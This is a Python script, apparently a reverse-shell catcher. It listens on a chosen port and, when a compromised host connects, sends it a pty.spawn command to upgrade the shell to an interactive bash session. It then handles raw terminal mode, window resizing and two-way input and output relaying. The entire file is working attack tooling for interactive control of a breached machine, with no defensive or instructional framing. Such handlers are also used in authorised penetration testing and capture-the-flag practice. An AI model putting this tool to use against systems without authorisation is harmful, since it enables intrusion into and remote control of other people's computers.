import socket
import os
import pty
import termios
import struct
import sys
import fcntl
import signal
import select

def get_terminal_size():
    """Get the current terminal size."""
    rows, cols = os.popen('stty size', 'r').read().split()
    return int(rows), int(cols)

def set_window_size():
    """Set the window size of the local terminal."""
    rows, cols = get_terminal_size()
    window_size = struct.pack('HHHH', rows, cols, 0, 0)
    fcntl.ioctl(sys.stdout, termios.TIOCSWINSZ, window_size)

def setup_terminal():
    """Set up the terminal to raw mode, saving current attributes for restoration."""
    old_tty_attrs = termios.tcgetattr(sys.stdin)
    tty_attrs = termios.tcgetattr(sys.stdin)

    # Set terminal to raw mode: disable echo, canonical mode, signals, and flow control
    tty_attrs[3] &= ~(termios.ECHO | termios.ICANON | termios.ISIG | termios.IEXTEN)
    tty_attrs[1] &= ~(termios.OPOST)
    tty_attrs[0] &= ~(termios.IXON | termios.IXOFF | termios.INLCR | termios.ICRNL | termios.IGNCR)

    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, tty_attrs)

    return old_tty_attrs

def revert_terminal(old_tty_attrs):
    """Revert terminal to original settings."""
    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty_attrs)

def set_remote_window_size(conn):
    """Set the remote terminal size using stty commands."""
    rows, cols = get_terminal_size()
    conn.sendall(f'stty rows {rows} cols {cols}\n'.encode())

def main(port: int):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(('0.0.0.0', port))
        listener.listen(1)
        print(f"Listening on port {port}...")

        conn, addr = listener.accept()
        print(f"Connection received from {addr}")

        # Send command to upgrade the shell and set terminal size
        conn.send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
        
        old_tty_attrs = setup_terminal()

        try:
            # Set the window size on both the local and remote terminal
            set_window_size()
            set_remote_window_size(conn)

            def resize_handler(signum, frame):
                set_window_size()
                set_remote_window_size(conn)

            signal.signal(signal.SIGWINCH, resize_handler)  # Handle terminal resize

            while True:
                r, _, _ = select.select([sys.stdin, conn], [], [])
                if sys.stdin in r:
                    data = os.read(sys.stdin.fileno(), 1024)
                    if len(data) == 0:
                        break
                    conn.send(data)
                if conn in r:
                    data = conn.recv(1024)
                    if len(data) == 0:
                        break
                    os.write(sys.stdout.fileno(), data)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            revert_terminal(old_tty_attrs)
            conn.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    main(port)
